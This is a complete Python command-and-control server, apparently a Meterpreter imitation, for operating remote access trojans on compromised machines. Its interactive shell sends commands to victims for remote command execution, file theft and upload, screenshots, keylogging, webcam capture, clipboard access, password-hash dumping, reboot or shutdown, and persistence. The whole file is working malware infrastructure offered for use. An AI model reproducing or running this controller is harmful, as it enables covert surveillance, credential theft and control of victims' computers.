#!/usr/bin/env python3
import socket
import threading
import json
import struct
import sys
import os
import readline  # For better input handling
import base64
import time
from cmd import Cmd

class MeterpreterSession:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.info = None
        self.prompt = f"meterpreter > "
        
    def send_command(self, cmd_type, **kwargs):
        """Send command to RAT"""
        cmd = {"type": cmd_type, **kwargs}
        self.send_json(cmd)
        
    def send_json(self, data):
        """Send JSON with length prefix"""
        json_data = json.dumps(data).encode('utf-8')
        length = struct.pack('!I', len(json_data))
        self.conn.sendall(length + json_data)
        
    def recv_json(self, timeout=10):
        """Receive JSON response"""
        self.conn.settimeout(timeout)
        try:
            # Get length
            length_data = self.recv_all(4)
            if not length_data:
                return None
            length = struct.unpack('!I', length_data)[0]
            
            # Get data
            json_data = self.recv_all(length)
            if json_data:
                return json.loads(json_data.decode('utf-8'))
        except:
            return None
        return None
    
    def recv_all(self, n):
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            try:
                chunk = self.conn.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except:
                return None
        return data
    
    def close(self):
        """Close session"""
        try:
            self.conn.close()
        except:
            pass

class MeterpreterShell(Cmd):
    def __init__(self, session):
        super().__init__()
        self.session = session
        self.prompt = f"meterpreter [{session.addr[0]}] > "
        self.modules = {}
        self.current_module = None
        
    def do_sysinfo(self, args):
        """Get system information"""
        self.session.send_command("sysinfo")
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_ps(self, args):
        """List running processes"""
        self.session.send_command("ps")
        response = self.session.recv_json()
        if response and "processes" in response:
            print(f"\n{'PID':<10} {'Name':<30} {'Memory':<15}")
            print("-" * 60)
            for proc in response["processes"][:20]:  # First 20
                pid = proc.get("pid", "N/A")
                name = proc.get("name", proc.get("command", "N/A"))
                if len(name) > 28:
                    name = name[:25] + "..."
                mem = proc.get("memory", proc.get("mem", "N/A"))
                print(f"{pid:<10} {name:<30} {mem:<15}")
        else:
            self.print_response(response)
    
    def do_kill(self, args):
        """Kill a process: kill <PID>"""
        if not args:
            print("Usage: kill <PID>")
            return
        self.session.send_command("kill", pid=int(args))
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_shell(self, args):
        """Execute shell command: shell <command>"""
        if not args:
            print("Usage: shell <command>")
            return
        self.session.send_command("shell", command=args)
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_execute(self, args):
        """Execute a program: execute <path> [args]"""
        parts = args.split(' ', 1)
        if len(parts) < 1:
            print("Usage: execute <path> [args]")
            return
        path = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ""
        self.session.send_command("execute", path=path, args=cmd_args)
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_ls(self, args):
        """List directory: ls [path]"""
        path = args.strip() if args else "."
        self.session.send_command("ls", path=path)
        response = self.session.recv_json()
        if response and "items" in response:
            print(f"\nDirectory: {response.get('path', '.')}")
            print(f"{'Type':<6} {'Permissions':<10} {'Size':<12} {'Name':<30}")
            print("-" * 60)
            for item in response["items"][:50]:  # First 50
                item_type = item.get("type", "?")
                perm = item.get("permissions", "???")
                size = self.format_size(item.get("size", 0))
                name = item.get("name", "?")
                if len(name) > 28:
                    name = name[:25] + "..."
                print(f"{item_type:<6} {perm:<10} {size:<12} {name:<30}")
        else:
            self.print_response(response)
    
    def do_cd(self, args):
        """Change directory: cd <path>"""
        if not args:
            print("Usage: cd <path>")
            return
        self.session.send_command("cd", path=args)
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_pwd(self, args):
        """Print working directory"""
        self.session.send_command("pwd")
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_cat(self, args):
        """View file: cat <path>"""
        if not args:
            print("Usage: cat <path>")
            return
        self.session.send_command("cat", path=args)
        response = self.session.recv_json()
        if response and "content" in response:
            print(response["content"])
            if response.get("truncated"):
                print("\n[Output truncated, use download for full file]")
        else:
            self.print_response(response)
    
    def do_download(self, args):
        """Download file: download <remote_path> [local_path]"""
        parts = args.split(' ', 1)
        if len(parts) < 1:
            print("Usage: download <remote_path> [local_path]")
            return
        remote = parts[0]
        local = parts[1] if len(parts) > 1 else os.path.basename(remote)
        
        print(f"[*] Downloading {remote} to {local}...")
        self.session.send_command("download", rpath=remote, lpath=local)
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_upload(self, args):
        """Upload file: upload <local_path> <remote_path>"""
        parts = args.split(' ', 1)
        if len(parts) < 2:
            print("Usage: upload <local_path> <remote_path>")
            return
        local, remote = parts[0], parts[1]
        
        if not os.path.exists(local):
            print(f"[-] File not found: {local}")
            return
        
        print(f"[*] Uploading {local} to {remote}...")
        with open(local, 'rb') as f:
            content = f.read()
        
        self.session.send_command("upload", 
                                 lpath=local,
                                 rpath=remote,
                                 content=base64.b64encode(content).decode('utf-8'))
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_screenshot(self, args):
        """Take screenshot"""
        print("[*] Taking screenshot...")
        self.session.send_command("screenshot")
        response = self.session.recv_json()
        if response and "image" in response:
            filename = f"screenshot_{int(time.time())}.png"
            img_data = base64.b64decode(response["image"])
            with open(filename, 'wb') as f:
                f.write(img_data)
            print(f"[+] Screenshot saved as {filename}")
            print(f"[+] Resolution: {response.get('resolution', 'Unknown')}")
        else:
            self.print_response(response)
    
    # ========== KEYLOGGER COMMANDS ==========
    
    def do_keyscan_start(self, args):
        """Start keylogger"""
        self.session.send_command("keyscan_start")
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_keyscan_stop(self, args):
        """Stop keylogger"""
        self.session.send_command("keyscan_stop")
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_keyscan_dump(self, args):
        """Dump captured keystrokes"""
        self.session.send_command("keyscan_dump")
        response = self.session.recv_json()
        if response and "keystrokes" in response:
            print(f"\n[+] Captured {response.get('count', 0)} keystrokes:")
            print("-" * 60)
            print(response["sample"])
            print("-" * 60)
            # Option to save to file
            save = input("\nSave to file? (y/n): ").lower()
            if save == 'y':
                filename = f"keystrokes_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(response["keystrokes"])
                print(f"[+] Saved to {filename}")
        else:
            self.print_response(response)
    
    # ========== WEB/CAM COMMANDS ==========
    
    def do_webcam_list(self, args):
        """List available webcams"""
        self.session.send_command("webcam_list")
        response = self.session.recv_json()
        if response and "webcams" in response:
            print("\nAvailable webcams:")
            for cam in response["webcams"]:
                print(f"  [{cam['index']}] {cam.get('resolution', 'Unknown')}")
        else:
            self.print_response(response)
    
    def do_webcam_snap(self, args):
        """Take webcam snapshot: webcam_snap [index]"""
        index = int(args) if args.isdigit() else 0
        print(f"[*] Taking snapshot from webcam {index}...")
        self.session.send_command("webcam_snap", index=index)
        response = self.session.recv_json()
        if response and "image" in response:
            filename = f"webcam_{index}_{int(time.time())}.jpg"
            img_data = base64.b64decode(response["image"])
            with open(filename, 'wb') as f:
                f.write(img_data)
            print(f"[+] Snapshot saved as {filename}")
            print(f"[+] Resolution: {response.get('resolution', 'Unknown')}")
        else:
            self.print_response(response)
    
    # ========== CLIPBOARD COMMANDS ==========
    
    def do_clipboard_get(self, args):
        """Get clipboard contents"""
        self.session.send_command("clipboard_get")
        response = self.session.recv_json()
        if response and "clipboard" in response:
            print("\nClipboard contents:")
            print("-" * 60)
            print(response["clipboard"])
            print("-" * 60)
        else:
            self.print_response(response)
    
    def do_clipboard_set(self, args):
        """Set clipboard: clipboard_set <text>"""
        if not args:
            print("Usage: clipboard_set <text>")
            return
        self.session.send_command("clipboard_set", text=args)
        response = self.session.recv_json()
        self.print_response(response)
    
    # ========== SYSTEM COMMANDS ==========
    
    def do_ipconfig(self, args):
        """Get network configuration"""
        self.session.send_command("ipconfig")
        response = self.session.recv_json()
        if response and "output" in response:
            print(response["output"])
        else:
            self.print_response(response)
    
    def do_hashdump(self, args):
        """Dump password hashes (simulated)"""
        print("[*] Attempting to dump hashes...")
        self.session.send_command("hashdump")
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_reboot(self, args):
        """Reboot target"""
        confirm = input("[!] Really reboot the target? (y/n): ")
        if confirm.lower() == 'y':
            self.session.send_command("reboot")
            response = self.session.recv_json()
            self.print_response(response)
    
    def do_shutdown(self, args):
        """Shutdown target"""
        confirm = input("[!] Really shutdown the target? (y/n): ")
        if confirm.lower() == 'y':
            self.session.send_command("shutdown")
            response = self.session.recv_json()
            self.print_response(response)
    
    def do_persistence(self, args):
        """Enable/disable persistence: persistence <on|off>"""
        if args.lower() == 'on':
            self.session.send_command("persistence", enable=True)
        elif args.lower() == 'off':
            self.session.send_command("persistence", enable=False)
        else:
            print("Usage: persistence <on|off>")
            return
        response = self.session.recv_json()
        self.print_response(response)
    
    def do_exit(self, args):
        """Exit meterpreter session"""
        print("[*] Exiting meterpreter...")
        return True
    
    def do_background(self, args):
        """Background this session"""
        print("[*] Backgrounding session...")
        return True
    
    def do_help(self, args):
        """Show help for commands"""
        print("\n" + "="*70)
        print("METERPREETER COMMANDS")
        print("="*70)
        print("\nCore Commands:")
        print("  help                 - Show this help")
        print("  exit/background      - Exit or background session")
        print("\nSystem Commands:")
        print("  sysinfo              - Get system information")
        print("  ps                   - List processes")
        print("  kill <PID>           - Kill a process")
        print("  reboot               - Reboot target")
        print("  shutdown             - Shutdown target")
        print("  persistence <on|off> - Enable/disable persistence")
        print("\nFile System Commands:")
        print("  ls [path]            - List directory")
        print("  cd <path>            - Change directory")
        print("  pwd                  - Print working directory")
        print("  cat <path>           - View file")
        print("  download <r> [l]     - Download file")
        print("  upload <l> <r>       - Upload file")
        print("\nShell Commands:")
        print("  shell <cmd>          - Execute shell command")
        print("  execute <path> [args]- Execute program")
        print("\nKeylogger Commands:")
        print("  keyscan_start        - Start keylogger")
        print("  keyscan_stop         - Stop keylogger")
        print("  keyscan_dump         - Dump captured keystrokes")
        print("\nWebcam Commands:")
        print("  webcam_list          - List webcams")
        print("  webcam_snap [index]  - Take webcam snapshot")
        print("\nClipboard Commands:")
        print("  clipboard_get        - Get clipboard contents")
        print("  clipboard_set <text> - Set clipboard")
        print("\nNetwork Commands:")
        print("  ipconfig             - Network configuration")
        print("\nPrivilege Commands:")
        print("  hashdump             - Dump password hashes (simulated)")
        print("="*70 + "\n")
    
    def print_response(self, response):
        """Print response from RAT"""
        if not response:
            print("[-] No response from target")
        elif "error" in response:
            print(f"[-] Error: {response['error']}")
        elif "status" in response:
            print(f"[+] {response['status']}")
        elif "stdout" in response:
            if response["stdout"]:
                print(response["stdout"])
            if response.get("stderr"):
                print(f"[STDERR] {response['stderr']}")
        else:
            print(json.dumps(response, indent=2))
    
    def format_size(self, size):
        """Format file size"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.1f} {unit}"
            size /= 1024.0
        return f"{size:.1f} TB"

class MeterpreterC2:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = []
        self.current_session = None
        
    def handle_client(self, conn, addr):
        """Handle new client connection"""
        print(f"\n[+] New connection from {addr}")
        
        # Create session
        session = MeterpreterSession(conn, addr)
        
        # Get initial info
        try:
            initial = session.recv_json()
            if initial:
                print(f"[+] System: {initial.get('hostname', 'N/A')} ({initial.get('os', 'N/A')})")
                print(f"[+] User: {initial.get('user', 'N/A')}")
                print(f"[+] IP: {initial.get('ip', 'N/A')}")
        except:
            pass
        
        # Start meterpreter shell
        shell = MeterpreterShell(session)
        shell.cmdloop()
        
        # Cleanup
        session.close()
        print(f"[-] Session {addr} closed")
    
    def run(self):
        """Start C2 server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"[*] Meterpreter C2 Server listening on {self.host}:{self.port}")
        print("[*] Waiting for connections...")
        
        try:
            while True:
                conn, addr = server.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
        finally:
            server.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    
    server = MeterpreterC2(host, port)
    server.run()
